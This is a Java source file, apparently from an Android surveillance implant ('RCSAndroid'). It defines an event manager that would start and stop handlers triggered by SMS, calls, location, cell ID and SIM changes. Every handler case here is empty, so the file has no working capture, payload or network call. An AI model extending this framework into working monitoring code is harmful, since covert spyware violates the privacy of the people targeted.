/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import android.util.Log;

public class EventManager {
	private volatile static EventManager singleton;
	private Status statusObj;
	
	private HashMap<Integer, EventBase> running;
	
	public static EventManager self() {
		if (singleton == null) {
			synchronized(EventManager.class) {
				if (singleton == null) {
                    singleton = new EventManager();
                }
			}
		}

		return singleton;
	}
	
	private EventManager() {
		statusObj = Status.self();
		
		running = new HashMap<Integer, EventBase>();
	}
	
	/**
	 * mapAgent()
	 * Add agent id defined by "key" into the running map. If the agent
	 * is already present, the old object is returned.
	 * 
	 * @param key: Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase mapEvent(int key) {
		EventBase e = null;
		
		if (running.containsKey(key) == true) {
			return running.get(key);			
		}
		
		switch (key) {
			case Event.EVENT_TIMER:
				// e = new TimerEvent();
				break;
				
			case Event.EVENT_SMS:
				break;
				
			case Event.EVENT_CALL:
				break;
				
			case Event.EVENT_CONNECTION:
				break;
				
			case Event.EVENT_PROCESS:
				break;
				
			case Event.EVENT_CELLID:
				break;
				
			case Event.EVENT_QUOTA:
				break;
				
			case Event.EVENT_SIM_CHANGE:
				break;
				
			case Event.EVENT_LOCATION:
				break;
				
			case Event.EVENT_AC:
				break;
				
			case Event.EVENT_BATTERY:
				break;
				
			case Event.EVENT_STANDBY:
				break;
				
			default:
				break;
		}
		
		if (e != null) {
			running.put(key, e);
		}
		
		return e;
	}
	
	public void startEvents() {
		HashMap<Integer, Event> events;
		
		events = statusObj.getEventsMap();
		
		if (events == null) {
			Log.d("RCS", "Events map null");
			return;
		}
		
		if (running == null) {
			Log.d("RCS", "Running Events map null");
			return;
		}
		
		Iterator<Map.Entry<Integer, Event>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			Map.Entry<Integer, Event> pairs = it.next();
			
			EventBase e = mapEvent(pairs.getKey());
			
			if (e != null) {
				e.parse(pairs.getValue().getParams());
				e.start();
			}
		}
	}
	
	// XXX Deve essere bloccante? Ovvero attendere l'effettivo stop di tutto?
	public void stopEvents() {
		Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();
		
		while (it.hasNext()) {
			Map.Entry<Integer, EventBase> pairs = it.next();

			if (pairs.getValue().getStatus() != Event.EVENT_RUNNING)
				continue;
			
			pairs.getValue().stopThread();
		}	
	}
}
